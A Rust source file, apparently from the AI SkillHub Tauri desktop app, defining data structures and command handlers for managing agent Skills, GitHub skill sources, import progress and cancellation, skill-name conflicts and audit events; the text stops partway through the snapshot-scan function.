mod adapter_doctor;
mod codex_plugin_doctor;
mod legacy_cleanup;
mod mcp_center;
mod metadata;
mod migration_v4;
mod prompt_library;
mod security_scan;
mod source_governance;

// Cargo builds `#[cfg(test)]` for the library test harness, which is a separate
// Windows executable from the Tauri app binary. Pull the full Tauri-generated
// resource library into that harness so it receives the same Common Controls v6
// manifest and can start on a clean Windows runner.
#[cfg(all(test, target_os = "windows"))]
#[link(name = "resource", kind = "static")]
unsafe extern "C" {}

use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
use rusqlite::{params, Connection, OptionalExtension};
use security_scan::SourceSecurityFinding;
use serde::Serialize;
use serde_json::Value;
use std::collections::{hash_map::DefaultHasher, BTreeMap, BTreeSet, HashMap, HashSet};
use std::fs;
use std::hash::{Hash, Hasher};
use std::io::{self, Read};
use std::path::{Component, Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex, OnceLock,
};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use tauri::Emitter;
use zip::ZipArchive;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const NANOS_PER_SECOND: u128 = 1_000_000_000;
const SOURCE_POPULARITY_FRESH_TTL_NANOS: u128 = 6 * 60 * 60 * NANOS_PER_SECOND;
const SOURCE_POPULARITY_DEFERRED_BACKOFF_NANOS: u128 = 15 * 60 * NANOS_PER_SECOND;
// Keep source imports bounded, but allow self-contained production Skills with large
// template/icon libraries. ppt-master v4.4.0 contains about 12,350 files but only
// ~67 MB in its installable Skill subtree. Byte and per-file ceilings remain enforced.
const SOURCE_IMPORT_MAX_FILES: usize = 20_000;
const GITHUB_FALLBACK_MAX_FILES: usize = SOURCE_IMPORT_MAX_FILES;
const GITHUB_FALLBACK_MAX_BYTES: u64 = 80 * 1024 * 1024;
const GITHUB_FALLBACK_MAX_FILE_BYTES: u64 = 16 * 1024 * 1024;
const MANAGED_SOURCE_METADATA_FILE: &str = ".skillhub-source.json";
static SNAPSHOT_SCAN_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
static SOURCE_IMPORT_CANCELLATIONS: OnceLock<Mutex<HashMap<String, Arc<AtomicBool>>>> =
    OnceLock::new();
const SOURCE_IMPORT_PROGRESS_EVENT: &str = "source-import-progress";
const SOURCE_IMPORT_CANCELLED_MESSAGE: &str =
    "导入已取消；本次未完成的隔离下载已清理，正式技能库没有改变。";

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct LegacySnapshot {
    root: String,
    skills_dir: String,
    sources_dir: String,
    diagnostics_file: String,
    mode: String,
    summary: LegacySummary,
    skills: Vec<SkillCard>,
    sources: Vec<SourceCard>,
    agents: Vec<AgentCard>,
    agent_skill_statuses: Vec<AgentSkillStatusCard>,
    agent_adapters: Vec<AgentAdapterCard>,
    agent_doctors: Vec<adapter_doctor::AgentDoctorCard>,
    adapter_safety_checks: Vec<AdapterSafetyCheckCard>,
    adapter_capabilities: Vec<AdapterCapabilityCard>,
    workspaces: Vec<WorkspaceCard>,
    project_scans: Vec<ProjectScanCard>,
    presets: Vec<PresetCard>,
    snapshots: Vec<SnapshotCard>,
    backup_targets: Vec<BackupTargetCard>,
    backup_dry_run: Vec<BackupDryRunItemCard>,
    restore_dry_run: Vec<RestoreDryRunItemCard>,
    rollback_plan: Vec<RollbackPlanStepCard>,
    release_reports: Vec<ReleaseReportCard>,
    import_previews: Vec<ImportPreviewCard>,
    source_popularity: Vec<SourcePopularityCard>,
    source_governance: Vec<source_governance::SourceGovernanceCard>,
    source_quality_signals: Vec<source_governance::SourceQualitySignalCard>,
    last_sync_summary: SyncSummaryCard,
    skill_conflicts: Vec<SkillConflictCard>,
    operator_consent: OperatorConsentCard,
    tags: Vec<TagCard>,
    skill_folders: Vec<SkillFolderCard>,
    preset_distributions: Vec<PresetDistributionCard>,
    operation_runners: Vec<OperationRunnerCard>,
    write_gates: Vec<WriteGateCard>,
    desktop_qa_checks: Vec<DesktopQaCheckCard>,
    usage_stats: Vec<UsageStatCard>,
    audit_events: Vec<AuditEventCard>,
    diagnostics: DiagnosticSummary,
    index: IndexReport,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct LegacySummary {
    skills: usize,
    sources: usize,
    prompts: usize,
    agents_detected: usize,
    warnings: usize,
    diagnostics_status: String,
}

#[derive(Serialize, Default)]
#[serde(rename_all = "camelCase")]
struct SyncSummaryCard {
    generated_at: String,
    status: String,
    total: usize,
    succeeded: usize,
    failed: usize,
    skipped: usize,
    active_skills: usize,
    repositories: Vec<SyncRepositoryCard>,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SyncRepositoryCard {
    repository: String,
    action: String,
    status: String,
    message: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SkillCard {
    id: String,
    source_id: String,
    name: String,
    folder_name: String,
    category: String,
    description: String,
    note: String,
    source: String,
    health: String,
    enabled: bool,
    rating: u8,
    relative_path: String,
    tags: Vec<String>,
    usage_guide: String,
    metadata_origin: String,
    metadata_confidence: f64,
    /// Marks parent / router-hub Skills generated by AI SkillHub.
    /// True when SKILL.md description carries the [ROUTER-HUB] marker,
    /// the file lives under AI-SkillHub-local-routers/, or the skill name
    /// matches its source collection name (the convention used by
    /// docs/skill-router-standard.md).
    is_router_hub: bool,
    user_folder_id: String,
    user_folder_name: String,
    user_folder_color: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SkillConflictCard {
    conflict_key: String,
    child_name: String,
    status: String,
    default_skill_id: String,
    default_source_name: String,
    updated_at: String,
    choices: Vec<SkillConflictChoiceCard>,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SkillConflictChoiceCard {
    skill_id: String,
    skill_name: String,
    folder_name: String,
    source_name: String,
    relative_path: String,
    category: String,
    description: String,
}

#[derive(Clone, Default)]
struct SkillConflictChoiceState {
    default_skill_id: String,
    status: String,
    updated_at: String,
}

/// Mark string used in SKILL.md frontmatter to identify a parent / hub Skill.
const ROUTER_HUB_MARKER: &str = "[ROUTER-HUB]";
const CHILD_SKILL_MARKER: &str = "[CHILD-SKILL]";
const CONFLICT_DISPATCHER_MARKER: &str = "[CONFLICT-DISPATCHER]";
/// Folder under app-next/data/github_sources/ where AI SkillHub writes generated parent SKILL.md files.
/// The folder name lives OUTSIDE the upstream author's repository, per skill-router-standard.md rule 1.
const ROUTER_HUB_FOLDER: &str = "AI-SkillHub-local-routers";

/// Lower-case + collapse whitespace/underscore — matches V1 Normalize-SkillLookupName behavior.
fn normalize_skill_lookup(value: &str) -> String {
    let trimmed = value.trim().to_lowercase();
    let mut out = String::with_capacity(trimmed.len());
    let mut last_was_sep = false;
    for ch in trimmed.chars() {
        if ch == ' ' || ch == '\t' || ch == '_' {
            if !last_was_sep {
                out.push('-');
                last_was_sep = true;
            }
        } else {
            out.push(ch);
            last_was_sep = false;
        }
    }
    out
}

/// Report returned by the regenerate_router_hubs Tauri command.
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct RouterHubReport {
    plans: Vec<RouterHubPlanCard>,
    routers_root: String,
    real_writes_enabled: bool,
    committed: bool,
    total_collections: usize,
    written_count: usize,
    unchanged_count: usize,
    skipped_count: usize,
    health_warnings: Vec<RouterHubHealthWarning>,
    /// Same child Skill name appearing in 2+ collections — Claude only loads one,
    /// so the rest are silently shadowed. UI must surface these so the user can rename.
    duplicate_children: Vec<RouterHubDuplicateChild>,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct RouterHubDuplicateChild {
    child_name: String,
    collections: Vec<String>,
}

/// One row per repository in github_sources/ — describes whether AI SkillHub
/// would generate (or did generate) a parent / router-hub Skill for it.
#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct RouterHubPlanCard {
    collection_name: String,
    router_skill_name: String,
    router_skill_md_path: String,
    child_count: usize,
    children: Vec<String>,
    /// "planned" | "written" | "unchanged" | "skipped-single-child" | "skipped-collision" | "skipped-empty"
    status: String,
    summary: String,
}

/// Health gap surfaced alongside router generation — used for #3 (unquoted [ROUTER-HUB] description).
#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct RouterHubHealthWarning {
    skill_md_path: String,
    issue: String,
}

/// Decide whether a SkillCard represents the parent / router-hub entry of a collection.
/// Uses three independent signals so we still classify correctly when one source of truth is missing.
fn compute_is_router_hub(
    description: &str,
    relative_path: &str,
    source: &str,
    folder_name: &str,
    name: &str,
) -> bool {
    if description.contains(ROUTER_HUB_MARKER) || description.contains(CONFLICT_DISPATCHER_MARKER) {
        return true;
    }
    if relative_path.contains(ROUTER_HUB_FOLDER) {
        return true;
    }
    if !source.trim().is_empty() {
        let source_key = normalize_skill_lookup(source);
        if source_key == normalize_skill_lookup(folder_name)
            || source_key == normalize_skill_lookup(name)
        {
            return true;
        }
    }
    false
}

fn resolve_skill_source_id(
    skill: &SkillCard,
    source_ids: &HashMap<String, String>,
) -> Option<String> {
    if !skill.source_id.is_empty() && source_ids.values().any(|value| value == &skill.source_id) {
        return Some(skill.source_id.clone());
    }
    if skill.is_router_hub && skill.source.eq_ignore_ascii_case(ROUTER_HUB_FOLDER) {
        for candidate in [&skill.folder_name, &skill.name] {
            let key = candidate.to_lowercase();
            if let Some(source_id) = source_ids.get(&key) {
                return Some(source_id.clone());
            }
        }
    }

    source_ids.get(&skill.source.to_lowercase()).cloned()
}

fn managed_source_aliases(sources: &[SourceCard]) -> HashSet<String> {
    let mut aliases = HashSet::new();
    for source in sources {
        for alias in [&source.name, &source.id] {
            let key = normalize_skill_lookup(alias);
            if !key.is_empty() {
                aliases.insert(key);
            }
        }
        if let Some(folder_name) = Path::new(&source.local_path)
            .file_name()
            .and_then(|value| value.to_str())
        {
            aliases.insert(normalize_skill_lookup(folder_name));
        }
        if let Some((_owner, repo_name)) = parse_github_repo(&source.url) {
            aliases.insert(normalize_skill_lookup(&repo_name));
        }
    }
    aliases
}

fn is_unowned_internal_router(skill: &SkillCard, source_aliases: &HashSet<String>) -> bool {
    if !skill.is_router_hub || !skill.source.eq_ignore_ascii_case(ROUTER_HUB_FOLDER) {
        return false;
    }

    [&skill.folder_name, &skill.name]
        .iter()
        .map(|candidate| normalize_skill_lookup(candidate))
        .all(|candidate| !source_aliases.contains(&candidate))
}

fn retain_user_visible_skills(skills: &mut Vec<SkillCard>, sources: &[SourceCard]) {
    let source_aliases = managed_source_aliases(sources);
    skills.retain(|skill| !is_unowned_internal_router(skill, &source_aliases));
}

fn skill_conflict_identity(skill: &SkillCard) -> String {
    let relative_path = skill.relative_path.trim().replace('\\', "/");
    if !relative_path.is_empty() {
        return relative_path;
    }
    format!(
        "{}::{}::{}",
        skill.source.trim(),
        skill.folder_name.trim(),
        skill.name.trim()
    )
}

fn auto_route_priority(skill: &SkillCard) -> (u8, u8, u8, usize) {
    let health = match skill.health.as_str() {
        "ok" => 3,
        "info" => 2,
        "warn" => 1,
        _ => 0,
    };
    let depth = skill
        .relative_path
        .replace('\\', "/")
        .split('/')
        .filter(|part| !part.is_empty())
        .count();
    (
        u8::from(skill.enabled),
        health,
        skill.rating.min(5),
        usize::MAX.saturating_sub(depth),
    )
}

fn derive_skill_conflicts(
    skills: &[SkillCard],
    saved_choices: &HashMap<String, SkillConflictChoiceState>,
) -> Vec<SkillConflictCard> {
    let mut grouped: BTreeMap<String, Vec<&SkillCard>> = BTreeMap::new();

    for skill in skills {
        if skill.is_router_hub {
            continue;
        }
        let conflict_key = normalize_skill_lookup(&skill.name);
        if conflict_key.is_empty() {
            continue;
        }
        grouped.entry(conflict_key).or_default().push(skill);
    }

    let mut conflicts = Vec::new();
    for (conflict_key, mut group) in grouped {
        let mut seen_identities = HashSet::new();
        group.retain(|skill| seen_identities.insert(skill_conflict_identity(skill)));
        if group.len() < 2 {
            continue;
        }

        group.sort_by(|left, right| {
            auto_route_priority(right)
                .cmp(&auto_route_priority(left))
                .then_with(|| left.source.to_lowercase().cmp(&right.source.to_lowercase()))
                .then_with(|| {
                    left.relative_path
                        .to_lowercase()
                        .cmp(&right.relative_path.to_lowercase())
                })
        });

        let choices = group
            .iter()
            .map(|skill| SkillConflictChoiceCard {
                skill_id: skill_conflict_identity(skill),
                skill_name: skill.name.clone(),
                folder_name: skill.folder_name.clone(),
                source_name: skill.source.clone(),
                relative_path: skill.relative_path.clone(),
                category: skill.category.clone(),
                description: skill.description.clone(),
            })
            .collect::<Vec<_>>();

        let saved = saved_choices
            .get(&conflict_key)
            .cloned()
            .unwrap_or_default();
        let mut status = saved.status.clone();
        let default_choice = choices
            .iter()
            .find(|choice| choice.skill_id == saved.default_skill_id);
        let (default_skill_id, default_source_name) = if status == "default-set" {
            if let Some(choice) = default_choice {
                (choice.skill_id.clone(), choice.source_name.clone())
            } else {
                status = "auto-set".to_string();
                choices
                    .first()
                    .map(|choice| (choice.skill_id.clone(), choice.source_name.clone()))
                    .unwrap_or_default()
            }
        } else if status == "ignored" {
            (String::new(), String::new())
        } else {
            status = "auto-set".to_string();
            choices
                .first()
                .map(|choice| (choice.skill_id.clone(), choice.source_name.clone()))
                .unwrap_or_default()
        };

        conflicts.push(SkillConflictCard {
            child_name: choices
                .first()
                .map(|choice| choice.skill_name.clone())
                .unwrap_or_else(|| conflict_key.clone()),
            conflict_key,
            status,
            default_skill_id,
            default_source_name,
            updated_at: saved.updated_at,
            choices,
        });
    }

    conflicts
}

fn insert_source_id_alias(source_ids: &mut HashMap<String, String>, alias: &str, source_id: &str) {
    let key = alias.trim().to_lowercase();
    if !key.is_empty() {
        source_ids
            .entry(key)
            .or_insert_with(|| source_id.to_string());
    }
}

fn insert_source_id_primary(
    source_ids: &mut HashMap<String, String>,
    alias: &str,
    source_id: &str,
) {
    let key = alias.trim().to_lowercase();
    if !key.is_empty() {
        source_ids.insert(key, source_id.to_string());
    }
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SourceCard {
    id: String,
    name: String,
    source_type: String,
    health: String,
    url: String,
    skill_count: usize,
    mode: String,
    category_id: String,
    note: String,
    local_path: String,
    enabled: bool,
    rating: u8,
    tags: Vec<String>,
    created_at: String,
    usage_guide: String,
    metadata_origin: String,
    metadata_confidence: f64,
    user_folder_id: String,
    user_folder_name: String,
    user_folder_color: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SourcePopularityCard {
    source_id: String,
    source_name: String,
    url: String,
    owner: String,
    repo: String,
    created_at: String,
    stars: u64,
    forks: u64,
    open_issues: u64,
    last_updated_at: String,
    fetched_at: String,
    cache_status: String,
    error: String,
    local_total_count: usize,
    local_seven_day_count: usize,
    local_thirty_day_count: usize,
    trend_points: Vec<SourcePopularityTrendPointCard>,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SourcePopularityTrendPointCard {
    sampled_at: String,
    stars: u64,
    forks: u64,
    open_issues: u64,
    last_updated_at: String,
    cache_status: String,
}

struct GithubPopularityFetch {
    created_at: String,
    stars: u64,
    forks: u64,
    open_issues: u64,
    last_updated_at: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct OperatorConsentCard {
    real_writes_enabled: bool,
    enabled_at: String,
    updated_at: String,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct AgentCard {
    id: String,
    name: String,
    path: String,
    detected: bool,
    managed: bool,
    enabled: bool,
    skill_count: usize,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct AgentSkillStatusCard {
    id: String,
    agent_id: String,
    agent_name: String,
    skill_name: String,
    skill_folder_name: String,
    status: String,
    expected_path: String,
    target_path: String,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct AgentAdapterCard {
    id: String,
    name: String,
    vendor: String,
    skills_path_hint: String,
    detection_kind: String,
    install_scope: String,
    capability_level: String,
    docs_url: String,
    status: String,
    detected: bool,
    managed: bool,
    enabled: bool,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct AdapterSafetyCheckCard {
    id: String,
    adapter_id: String,
    check_key: String,
    status: String,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct AdapterCapabilityCard {
    id: String,
    adapter_id: String,
    capability_key: String,
    enabled: bool,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct BackupTargetCard {
    id: String,
    adapter_id: String,
    agent_name: String,
    target_path: String,
    backup_path: String,
    detected: bool,
    managed: bool,
    required: bool,
    preflight_status: String,
    risk_level: String,
    blocker: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct BackupDryRunItemCard {
    id: String,
    backup_target_id: String,
    adapter_id: String,
    agent_name: String,
    action: String,
    target_path: String,
    backup_path: String,
    status: String,
    risk_level: String,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct RestoreDryRunItemCard {
    id: String,
    backup_target_id: String,
    adapter_id: String,
    agent_name: String,
    action: String,
    target_path: String,
    backup_path: String,
    status: String,
    risk_level: String,
    summary: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct WorkspaceCard {
    id: String,
    name: String,
    scope: String,
    path: String,
    enabled: bool,
    agent_count: usize,
    skill_count: usize,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ProjectScanCard {
    id: String,
    workspace_id: String,
    path: String,
    has_git: bool,
    has_package_json: bool,
    has_cargo_toml: bool,
    has_tauri_config: bool,
    has_agents_md: bool,
    has_claude_md: bool,
    has_readme_md: bool,
    file_count: usize,
    scanned_at: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct PresetCard {
    id: String,
    name: String,
    description: String,
    color: String,
    enabled: bool,
    skill_count: usize,
    workspace_count: usize,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct TagCard {
    id: String,
    name: String,
    color: String,
    target_count: usize,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SkillFolderCard {
    id: String,
    name: String,
    note: String,
    color: String,
    sort_order: i64,
    skill_count: usize,
    created_at: String,
    updated_at: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct PresetDistributionCard {
    id: String,
    preset_id: String,
    preset_name: String,
    workspace_id: String,
    workspace_name: String,
    workspace_scope: String,
    enabled: bool,
    skill_count: usize,
    status: String,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct OperationRunnerCard {
    id: String,
    title: String,
    runner_type: String,
    status: String,
    locked: bool,
    last_run_at: String,
    export_dir: String,
    report_path: String,
    latest_json_path: String,
    latest_markdown_path: String,
    manifest_path: String,
    file_count: usize,
    summary: String,
    next_action: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct WriteGateCard {
    id: String,
    title: String,
    operation_type: String,
    status: String,
    unlocked: bool,
    risk_level: String,
    summary: String,
    next_action: String,
    plan_steps: Vec<String>,
    rollback_steps: Vec<String>,
    passing_checks: Vec<String>,
    blocking_checks: Vec<String>,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SnapshotCard {
    id: String,
    name: String,
    summary: String,
    created_at: String,
    is_latest: bool,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct RollbackPlanStepCard {
    id: String,
    snapshot_id: String,
    step_order: usize,
    title: String,
    risk_level: String,
    status: String,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct ReleaseReportCard {
    id: String,
    title: String,
    report_type: String,
    status: String,
    generated_at: String,
    version: String,
    ok: bool,
    total: u64,
    passed: u64,
    warn: u64,
    error: u64,
    summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct ImportPreviewCard {
    id: String,
    title: String,
    import_kind: String,
    status: String,
    summary: String,
    detail: String,
    skill_count: usize,
    prompt_count: usize,
    safe_to_continue: bool,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SourceImportPlanCard {
    id: String,
    import_kind: String,
    input: String,
    normalized_target: String,
    target_root: String,
    target_path: String,
    backup_path: String,
    display_name: String,
    status: String,
    risk_level: String,
    write_gate_status: String,
    safe_to_continue: bool,
    duplicate_source_id: String,
    duplicate_reason: String,
    skill_count: usize,
    prompt_count: usize,
    planned_steps: Vec<String>,
    install_plan_steps: Vec<String>,
    blocking_checks: Vec<String>,
    rollback_summary: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SourceImportExecutionCard {
    id: String,
    import_kind: String,
    input: String,
    status: String,
    risk_level: String,
    summary: String,
    staged_path: String,
    report_path: String,
    manifest_path: String,
    copied_files: usize,
    copied_bytes: u64,
    skill_count: usize,
    prompt_count: usize,
    blocking_checks: Vec<String>,
    rollback_steps: Vec<String>,
    real_write_scope: String,
    download_method: String,
    security_status: String,
    security_scanned_files: usize,
    security_findings: Vec<SourceSecurityFinding>,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SourceImportProgressEvent {
    operation_id: String,
    stage: String,
    state: String,
    message: String,
    current: u64,
    total: u64,
}

#[derive(Clone)]
struct SourceImportControl {
    operation_id: String,
    cancelled: Arc<AtomicBool>,
    app: Option<tauri::AppHandle>,
}

impl SourceImportControl {
    #[cfg(test)]
    fn detached(operation_id: impl Into<String>) -> Self {
        Self {
            operation_id: operation_id.into(),
            cancelled: Arc::new(AtomicBool::new(false)),
            app: None,
        }
    }

    #[cfg(test)]
    fn detached_with_cancellation(
        operation_id: impl Into<String>,
        cancelled: Arc<AtomicBool>,
    ) -> Self {
        Self {
            operation_id: operation_id.into(),
            cancelled,
            app: None,
        }
    }

    fn with_app(
        operation_id: impl Into<String>,
        cancelled: Arc<AtomicBool>,
        app: tauri::AppHandle,
    ) -> Self {
        Self {
            operation_id: operation_id.into(),
            cancelled,
            app: Some(app),
        }
    }

    fn is_cancelled(&self) -> bool {
        self.cancelled.load(Ordering::SeqCst)
    }

    fn ensure_active(&self) -> Result<(), String> {
        if self.is_cancelled() {
            Err(SOURCE_IMPORT_CANCELLED_MESSAGE.to_string())
        } else {
            Ok(())
        }
    }

    fn emit(&self, stage: &str, state: &str, message: impl Into<String>, current: u64, total: u64) {
        let Some(app) = self.app.as_ref() else {
            return;
        };
        let _ = app.emit(
            SOURCE_IMPORT_PROGRESS_EVENT,
            SourceImportProgressEvent {
                operation_id: self.operation_id.clone(),
                stage: stage.to_string(),
                state: state.to_string(),
                message: message.into(),
                current,
                total,
            },
        );
    }
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SourceImportPromotionCard {
    id: String,
    import_kind: String,
    source_name: String,
    status: String,
    risk_level: String,
    summary: String,
    staged_path: String,
    target_path: String,
    report_path: String,
    manifest_path: String,
    copied_files: usize,
    copied_bytes: u64,
    skill_count: usize,
    prompt_count: usize,
    blocking_checks: Vec<String>,
    rollback_steps: Vec<String>,
    real_write_scope: String,
    security_status: String,
    security_scanned_files: usize,
    security_findings: Vec<SourceSecurityFinding>,
    security_review_confirmed: bool,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct DesktopQaCheckCard {
    id: String,
    title: String,
    description: String,
    status: String,
    required: bool,
    evidence: String,
    updated_at: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct UsageStatCard {
    target_type: String,
    target_id: String,
    target_name: String,
    source_name: String,
    total_count: usize,
    seven_day_count: usize,
    thirty_day_count: usize,
    last_used_at: String,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct AuditEventCard {
    id: String,
    event_type: String,
    summary: String,
    detail_json: String,
    created_at: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct DiagnosticSummary {
    available: bool,
    app_version: String,
    generated_at: String,
    overall_status: String,
    ok: u64,
    warn: u64,
    error: u64,
    info: u64,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct IndexReport {
    persisted: bool,
    database_file: String,
    indexed_at: String,
    sources_indexed: usize,
    skills_indexed: usize,
    agents_indexed: usize,
    snapshot_id: String,
}

#[derive(Default)]
struct SkillDiagnostic {
    name: String,
    description: String,
    repo: String,
    target: String,
    has_skill_md: bool,
    has_front_matter: bool,
}

#[derive(Default)]
struct SourceConfig {
    name: String,
    url: String,
    source_type: String,
    mode: String,
    category_id: String,
    note: String,
}

#[derive(Default)]
struct EnabledState {
    agents: HashMap<String, bool>,
    agent_adapters: HashMap<String, bool>,
    workspaces: HashMap<String, bool>,
    presets: HashMap<String, bool>,
}

#[derive(Clone)]
struct TagOverrideRow {
    target_id: String,
    tag_id: String,
    updated_at: String,
}

#[derive(Clone)]
struct PresetWorkspacePolicy {
    preset_id: String,
    workspace_id: String,
    enabled: bool,
    updated_at: String,
}

#[tauri::command]
async fn scan_legacy_snapshot() -> Result<LegacySnapshot, String> {
    run_blocking_task(scan_legacy_snapshot_blocking).await
}

#[tauri::command]
async fn load_indexed_snapshot() -> Result<LegacySnapshot, String> {
    run_blocking_task(load_indexed_snapshot_blocking).await
}

#[tauri::command]
async fn run_skillhub_sync() -> Result<LegacySnapshot, String> {
    run_blocking_task(run_skillhub_sync_blocking).await
}

#[tauri::command]
async fn ensure_agent_skill_delivery() -> Result<LegacySnapshot, String> {
    run_blocking_task(ensure_agent_skill_delivery_blocking).await
}

#[tauri::command]
async fn set_source_version_pin(source_id: String, pinned: bool) -> Result<LegacySnapshot, String> {
    run_blocking_task(move || set_source_version_pin_blocking(source_id, pinned)).await
}

#[tauri::command]
async fn refresh_source_version_status(source_id: String) -> Result<LegacySnapshot, String> {
    run_blocking_task(move || refresh_source_version_status_blocking(source_id)).await
}

#[tauri::command]
async fn rollback_source_to_latest_backup(source_id: String) -> Result<LegacySnapshot, String> {
    run_blocking_task(move || rollback_source_to_latest_backup_blocking(source_id)).await
}

#[tauri::command]
async fn refresh_agent_detection() -> Result<LegacySnapshot, String> {
    run_blocking_task(refresh_agent_detection_blocking).await
}

#[tauri::command]
async fn refresh_source_popularity() -> Result<LegacySnapshot, String> {
    run_blocking_task(refresh_source_popularity_blocking).await
}

#[tauri::command]
async fn reanalyze_library_metadata() -> Result<LegacySnapshot, String> {
    run_blocking_task(reanalyze_library_metadata_blocking).await
}

#[tauri::command]
async fn preview_legacy_cleanup_candidates(
) -> Result<Vec<legacy_cleanup::LegacyCleanupCandidateCard>, String> {
    run_blocking_task(preview_legacy_cleanup_candidates_blocking).await
}

fn preview_legacy_cleanup_candidates_blocking(
) -> Result<Vec<legacy_cleanup::LegacyCleanupCandidateCard>, String> {
    let root = resolve_legacy_root()?;
    legacy_cleanup::list_legacy_cleanup_candidates(&legacy_cleanup_config(&root))
}

#[tauri::command]
async fn cleanup_legacy_candidate(
    candidate_id: String,
) -> Result<legacy_cleanup::LegacyCleanupOperationCard, String> {
    run_blocking_task(move || cleanup_legacy_candidate_blocking(&candidate_id)).await
}

fn cleanup_legacy_candidate_blocking(
    candidate_id: &str,
) -> Result<legacy_cleanup::LegacyCleanupOperationCard, String> {
    let root = resolve_legacy_root()?;
    let operation =
        legacy_cleanup::move_legacy_cleanup_candidate(&legacy_cleanup_config(&root), candidate_id)?;
    let connection = open_index_database(&root)?;
    write_audit_event(
        &connection,
        "legacy_cleanup_completed",
        &format!(
            "Moved legacy portable data {} to a recoverable backup",
            operation.candidate_id
        ),
        serde_json::json!({
            "candidateId": operation.candidate_id,
            "originalPath": operation.original_path,
            "backupPath": operation.backup_path,
            "totalBytes": operation.total_bytes,
            "fileCount": operation.file_count,
            "linkCount": operation.link_count,
            "recoverable": operation.recoverable,
        }),
    )?;
    Ok(operation)
}

fn reanalyze_library_metadata_blocking() -> Result<LegacySnapshot, String> {
    let scanned = scan_legacy_snapshot_blocking()?;
    let root = PathBuf::from(&scanned.root);
    if let Ok(connection) = open_index_database(&root) {
        let _ = write_audit_event(
            &connection,
            "library_metadata_reanalyzed",
            "Reanalyzed source and Skill metadata with the offline analyzer",
            serde_json::json!({
                "analyzerVersion": metadata::ANALYZER_VERSION,
                "sources": scanned.sources.len(),
                "skills": scanned.skills.len(),
                "manualOverridesPreserved": true,
            }),
        );
    }
    // Read the just-persisted base index back through the override-aware queries.
    // This guarantees that the command never returns inferred values over a user's
    // display name, category, description, note, tags, rating, or enabled choice.
    load_indexed_snapshot_blocking()
}

async fn run_blocking_task<T, F>(task: F) -> Result<T, String>
where
    T: Send + 'static,
    F: FnOnce() -> Result<T, String> + Send + 'static,
{
    tauri::async_runtime::spawn_blocking(task)
        .await
        .map_err(|error| format!("后台任务启动失败：{}", error))?
}

fn scan_legacy_snapshot_blocking() -> Result<LegacySnapshot, String> {
    // React development mode and overlapping desktop actions can request a scan
    // at the same time. Source migration owns resumable staging directories, so
    // only one scanner may copy/promote/finalize them inside this process.
    let _scan_guard = SNAPSHOT_SCAN_LOCK
        .get_or_init(|| Mutex::new(()))
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let root = resolve_legacy_root()?;
    let pending_migration = begin_migration_v4(&root)?;

    let skills_dir = active_skills_dir(&root);
    let sources_dir = active_sources_dir(&root);
    let diagnostics_file = diagnostics_file(&root);
    let config_file = skillhub_config_file(&root);

    let diagnostics_json = read_json(&diagnostics_file);
    let config_json = read_json(&config_file);
    let mut diagnostic_skills = parse_diagnostic_skills(diagnostics_json.as_ref());
